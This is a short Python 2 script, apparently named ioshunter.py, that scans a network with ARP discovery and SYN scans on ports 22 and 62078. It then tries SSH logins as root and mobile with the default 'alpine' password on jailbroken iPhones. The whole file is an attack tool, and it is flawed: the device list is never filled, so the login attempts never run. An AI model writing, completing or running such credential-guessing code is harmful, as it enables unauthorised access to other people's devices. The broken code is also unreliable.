#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Dummy iOS hunter searches jailbroken devices with alpine password

__author__ = '090h'
__license__ = 'GPL'

# import scapy silently
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0

from sys import argv
import paramiko

# def icmp_ping(host):
#     ans,unans=sr(IP(dst=host)/ICMP())
#     # Information on live hosts can be collected with the following request:
#     ans.summary(lambda (s, r): r.sprintf("%IP.src% is alive"))


def ssh_auth(host, port, user, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        print("Try: " + host)
        ssh.connect(hostname=host,port=port, username=user, password=password)
        print("Correct: "+ password)
        ssh.close()
        return True
    except paramiko.AuthenticationException, error:
        print("Invarid : "+ password)
    except socket.error, error:
        print error
    except paramiko.SSHException, error:
        print error
    except Exception, error:
        print str(error)
    finally:
        if not ssh is None:
            ssh.close()
    return False


def syn_scan(host, port):
    '''SYN scan'''

    ans, unans = sr(IP(dst=host)/TCP(flags="S", dport=port))
    # Possible result visualization: open ports
    ans.nsummary(lfilter=lambda (s, r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)))
    return ans


def hack_ios_devices(host):
    print("ARP discovery... %s" % host)
    ans, unans = arping(host)
    ans.summary(lambda (s, r): r.sprintf("%Ether.src% %ARP.psrc%") )
    print('SYN scan')
    res = syn_scan(host, port=(22,62078))

    devices = []
    for device in devices:
        ssh_auth(device, 22, 'root', 'alpine')
        ssh_auth(device, 22, 'mobile', 'alpine')

if __name__ == '__main__':
    if len(argv) == 1:
        print('Usage:\n\t./ioshunter.py <network>')
    else:
        hack_ios_devices(argv[1])

